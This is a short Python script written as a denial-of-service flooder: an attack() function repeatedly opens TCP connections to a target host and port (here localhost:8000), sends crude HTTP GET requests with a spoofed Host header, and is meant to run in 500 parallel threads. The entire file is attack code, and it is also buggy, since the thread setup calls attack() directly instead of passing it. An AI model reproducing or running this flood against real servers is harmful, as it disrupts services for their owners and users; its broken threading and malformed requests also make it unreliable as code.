import socket
import threading

target = "localhost"
port = 8000
fake_ip = "167.43.225.145"
a_c = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / " + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

        global a_c
        a_c += 1
        print(a_c)


for x in range(500):
    thread = threading.Thread(target=attack())
    thread.start()
